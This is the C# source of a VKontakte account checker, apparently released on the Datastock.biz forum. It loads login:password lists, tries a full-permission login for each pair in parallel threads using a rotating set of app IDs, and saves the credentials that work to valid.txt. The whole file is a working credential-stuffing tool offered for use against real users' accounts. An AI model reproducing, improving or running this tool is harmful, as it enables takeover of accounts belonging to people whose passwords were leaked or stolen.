using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using VkNet;
using System.Threading;
using VkNet.Model;
using VkNet.Enums.Filters;
using VkNet.Exception;
using System.Diagnostics;

namespace Checker
{
    class Program
    {
        public static int max;
        public static ulong id;

        public static List<string> accounts = new List<string>();

        public static List<string> valid = new List<string>();
        public static List<string> invalid = new List<string>();

        public static List<ulong> appids = new List<ulong>() { 2890984, 6121396, 2890984, 5256902, 5676187, 3116505, 6146827 };

        static void Main(string[] args)
        {
            Console.Title = "VK Accounts Checker special for Datastock.biz";
            if (string.IsNullOrEmpty(Data.Default.Language))
            {
            Settings:
                Console.WriteLine("Please, choose program language (ru/en):");
                string response = Console.ReadLine().ToLower();
                if (response != "en" && response != "ru")
                {
                    Console.WriteLine("Unknown language.\n");
                    goto Settings;
                }
                Data.Default.Language = response;
                Data.Default.Save();
            }
            Console.WriteLine("VK Accounts Checker by Irval. Special for Datastock.biz" + (Data.Default.Language == "ru" ? "\nОфициальная тема: https://datastock.biz/threads/1920/ \nТекущая версия: 1.0.12\n\n" : "\nOfficial thread: https://datastock.biz/threads/1920/ \nCurrent version: 1.0.12\n\n"));

            Console.WriteLine(Data.Default.Language == "ru" ? "Желаете ли вы сменить язык программы?" : "Do you want to change program language?");
            var resp = Console.ReadLine().ToLower();
            if (resp.StartsWith("y") || resp.StartsWith("д"))
            {
                Data.Default.Language = Data.Default.Language == "en" ? "ru" : "en";
                Data.Default.Save();

                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                Process.Start(path);
                Process.GetCurrentProcess().Kill();

            }
        Dir:
            Console.WriteLine(Data.Default.Language == "ru" ? "\nУкажите путь к файлу с аккаунтами (формат log:pass):" : "\nEnter the path to the accounts file (format log:pass):");
            var Directory = Console.ReadLine();

            if (!File.Exists(Directory))
            {
                Console.Clear();
                Console.WriteLine(Data.Default.Language == "ru" ? "Файл не найден\n" : "Cannot find file\n");
                goto Dir;
            }

            Console.WriteLine("\n" + Count(Directory));
            if (accounts.Count == 0)
            {
                Console.ReadLine();
                goto Dir;
            }
            Console.WriteLine(Data.Default.Language == "ru" ?  "\nПродолжить?" : "\nContinue?");
            string res = Console.ReadLine().ToLower();
            if (res.StartsWith("n") || res.StartsWith("н"))
            {
                Console.Clear();
                goto Dir;
            }
            Console.Clear();

        Set1:
            Console.WriteLine(Data.Default.Language == "ru" ? "Application ID (для использования App ID от ВКонтакте, оставьте строку пустой):" : "Application ID (to use the App ID from VKontakte, leave the line empty):");
            var id_text = Console.ReadLine();
            if (id_text != "")
            {
                if (ulong.TryParse(id_text, out ulong int64))
                    id = Convert.ToUInt64(id_text);
                else
                {
                    Console.WriteLine(Data.Default.Language == "ru" ? "Неверный формат Application ID\n" : "Wrong format Application ID\n");
                    goto Set1;
                }
            }
            else
                id = appids[new Random().Next(appids.Count - 1)];

        Set2:
            Console.WriteLine(Data.Default.Language == "ru" ? "\nУкажите количество потоков:" : "\nSpecify the number of threads:");
            var threads_str = Console.ReadLine();
            if (!int.TryParse(threads_str, out int int32))
            {
                Console.Clear();
                Console.WriteLine(Data.Default.Language == "ru" ? "Ошибка ввода. Введено не число\n" : "Input Error. No number entered\n");
                goto Set2;
            }

            max = Convert.ToInt32(threads_str);

            if (max <= 0)
            {
                Console.Clear();
                Console.WriteLine(Data.Default.Language == "ru" ? "Ошибка ввода. Число должно быть больше 0\n" : "Input Error. The number must be greater than 0\n");
                goto Set2;
            }
            int count = accounts.Count / max;

            for (int i = 0; i < max; i++)
            {
                var checker = new Thread(Checker);

                if (i != max - 1)
                    checker.Start(accounts.Skip(i * count).Take(count).ToList());
                else
                    checker.Start(accounts.Skip(i * count).ToList());
            }

            Console.WriteLine((Data.Default.Language == "ru" ? "\nЧекер запущен. Используется " : "\nChecker is running. Is used ") + ThreadsWord(max));

            while (valid.Count + invalid.Count < accounts.Count) ;

            if (Data.Default.Language == "ru")
            {
                Console.WriteLine($"\nВалидных аккаунтов: {valid.Count}");
                Console.WriteLine($"Невалидных аккаунтов: {invalid.Count}");
            }
            else
            {
                Console.WriteLine($"\nValid accounts: {valid.Count}");
                Console.WriteLine($"Invalid accounts: {invalid.Count}");
            }

            try
            {
                File.WriteAllText(Directory.Substring(0, Directory.LastIndexOf(@"\")) + @"\valid.txt", string.Join("\n", valid));
                File.WriteAllText(Directory.Substring(0, Directory.LastIndexOf(@"\")) + @"\invalid.txt", string.Join("\n", invalid));
                Console.WriteLine((Data.Default.Language == "ru" ? "Файлы с проверенными аккаунтами созданы в директории ":"Files with verified accounts are created in the directory ") + Directory.Substring(0, Directory.LastIndexOf(@"\")) + @"\");
            }
            catch
            {
                if (Data.Default.Language == "ru")
                {
                    Console.WriteLine("\n\nНе удалось записать проверенные аккаунты в файлы!");
                    Console.WriteLine("\nВалидные аккаунты:");
                    Console.WriteLine(string.Join("\n", valid));
                    Console.WriteLine("\nНеалидные аккаунты:");
                    Console.WriteLine(string.Join("\n", invalid));
                }
                else
                {
                    Console.WriteLine("\n\nFailed to write checked accounts to files!");
                    Console.WriteLine("\nValid accounts:");
                    Console.WriteLine(string.Join("\n", valid));
                    Console.WriteLine("\nInvalid accounts:");
                    Console.WriteLine(string.Join("\n", invalid));
                }
            }

            Console.ReadLine();
        }

        static void Checker(object obj)
        {
            var list = (List<string>)obj;

            for (int i = 0; i < list.Count; i++)
            {
                try
                {
                    VkApi vkapi = new VkApi();
                    var data = list[i].Split(':');
                    vkapi.Authorize(new ApiAuthParams()
                    {
                        Login = data[0],
                        Password = data[1],
                        ApplicationId = id,
                        Settings = Settings.All
                    });

                    valid.Add(list[i]);

                }
                catch (VkAuthorizationException)
                {
                    invalid.Add(list[i]);
                }
            }
        }

        static string ThreadsWord(int count)
        {
            int last = count % 10;

            if (Data.Default.Language == "ru")
            {
                if (last == 0)
                    return $"{count} потоков";
                else if (last == 1)
                    return $"{count} поток";
                else if (last > 1 && last <= 4)
                    return $"{count} потока";
                else if (last > 4)
                    return $"{count} потоков";

                return $"{count} потоков";
            }
            else
                return $"{count} threads";
        }

        static string Count(string dir)
        {
            using (StreamReader sr = new StreamReader(dir))
            {
                String line;
                Int64 i = 0;
                Int64 count = 0;
                while ((line = sr.ReadLine()) != null)
                {
                    try
                    {
                        i++;
                        if (line.Contains(":"))
                        {
                            accounts.Add(line);
                            count++;
                        }
                    }
                    catch (Exception e)
                    {
                        return (e.Message);
                    }
                }
                accounts = accounts.Distinct().ToList();
                if (Data.Default.Language == "ru")
                {
                    if (count > 0)
                        return "Количество найденных строк: " + i.ToString() + "\nКоличество аккаунтов: " + count.ToString() + "\nКоличество уникальных аккаунтов: " + accounts.Count.ToString() + (i == count ? "\nКоличество аккаунтов совпадает с количеством строк" : "\nКоличество аккаунтов не совпадает с количеством строк");
                    else
                        return "Количество найденных строк: " + i.ToString() + "\nКоличество аккаунтов: " + count.ToString();
                }
                else
                {
                    if (count > 0)
                        return "Number of rows found: " + i.ToString() + "\nNumber of accounts: " + count.ToString() + "\nNumber of unique accounts: " + accounts.Count.ToString() + (i == count ? "\nThe number of accounts matches the number of rows" : "\nThe number of accounts does not match the number of rows");
                    else
                        return "Number of rows found: " + i.ToString() + "\nNumber of accounts: " + count.ToString();
                }
            }

        }
    }
}

